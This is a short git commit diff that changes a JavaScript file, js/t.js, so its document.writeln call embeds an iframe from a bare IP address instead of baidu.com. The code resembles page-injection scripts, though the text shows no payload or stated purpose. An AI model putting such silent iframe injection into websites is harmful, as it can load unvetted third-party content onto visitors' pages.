d91281d405739646161ffada1fc58720a51ec998
binglun30 <35474337+binglun30@users.noreply.github.com>
2018-06-01 01:02:39 +0800

    Update t.js

--- js/t.js
+++ js/t.js
@@ -1,5 +1,1 @@
-document.writeln("<iframe scrolling=\"yes\" frameborder=\"10\" margin
-
-height=\"0\" marginwidth=\"0\" width=\"775\" height=\"200\" src=\"htt
-
-p:////www.baidu.com//index.html\"><\/iframe>");
+document.writeln("<iframe scrolling=\"yes\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" width=\"775\" height=\"200\" src=\"http:////118.24.25.42//index.html\"><\/iframe>");
